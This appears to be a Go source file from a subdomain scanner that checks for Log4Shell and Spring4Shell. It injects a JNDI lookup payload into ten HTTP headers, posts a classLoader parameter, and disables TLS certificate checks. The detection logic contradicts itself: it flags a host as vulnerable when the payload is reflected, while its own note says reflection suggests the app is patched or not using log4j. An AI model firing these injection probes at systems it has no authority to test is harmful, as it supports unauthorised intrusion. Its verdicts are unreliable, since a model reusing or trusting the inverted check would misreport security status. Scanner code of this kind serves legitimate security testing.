package log4shell

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

type Result struct {
	Subdomain  string
	Vulnerable bool
	// Header that triggered: we send JNDI payloads in common headers and check for callback
	// Since we can't receive OAST callbacks here, we detect via error responses or reflection
	Headers    []string // headers where payload was reflected
	Notes      string
}

var httpClient = &http.Client{
	Timeout: 10 * time.Second,
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	},
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
}

// jndiHeaders are common headers where Log4Shell payloads are injected.
var jndiHeaders = []string{
	"X-Api-Version",
	"X-Forwarded-For",
	"User-Agent",
	"Referer",
	"X-Forwarded-Host",
	"X-Client-IP",
	"CF-Connecting-IP",
	"True-Client-IP",
	"Contact",
	"X-Originating-IP",
}

// Check sends Log4Shell detection payloads in HTTP headers.
// Since we can't receive OAST callbacks in-process, we:
// 1. Send a payload that causes an error in vulnerable apps (${jndi:ldap://127.0.0.1:1234/a})
// 2. Check if the payload is reflected in the response (indicates no sanitization)
// 3. Check for Spring4Shell (class.module.classLoader) in parameters
func Check(subdomain string, timeout time.Duration) *Result {
	result := &Result{Subdomain: subdomain}

	// Payload designed to cause a detectable error in vulnerable log4j (not a real OAST)
	// We use an obviously invalid local address that won't route anywhere
	payload := "${jndi:ldap://127.0.0.1:1389/subhawk-detect}"

	for _, scheme := range []string{"https", "http"} {
		base := scheme + "://" + subdomain

		// Test each header
		for _, header := range jndiHeaders {
			req, err := http.NewRequest("GET", base, nil)
			if err != nil {
				break
			}
			req.Header.Set(header, payload)
			req.Header.Set("User-Agent", "Mozilla/5.0 (subhawk-scanner)")

			resp, err := httpClient.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
			resp.Body.Close()

			// Check if payload is reflected (log4j would process it, not reflect it)
			// Reflection means the app put the raw string in the response without processing
			if strings.Contains(string(body), "${jndi") {
				result.Headers = append(result.Headers, fmt.Sprintf("%s (reflected in response)", header))
				result.Notes = "payload reflected — app may not be using log4j or has patched"
			}
		}

		// Spring4Shell: class.module.classLoader in POST params
		req, err := http.NewRequest("POST", base, strings.NewReader("class.module.classLoader.urls[0]=test"))
		if err == nil {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			resp, err := httpClient.Do(req)
			if err == nil {
				resp.Body.Close()
				if resp.StatusCode == 400 || resp.StatusCode == 500 {
					result.Notes += " Spring4Shell: unusual status on classLoader param"
				}
			}
		}

		break // only try first working scheme
	}

	result.Vulnerable = len(result.Headers) > 0
	return result
}
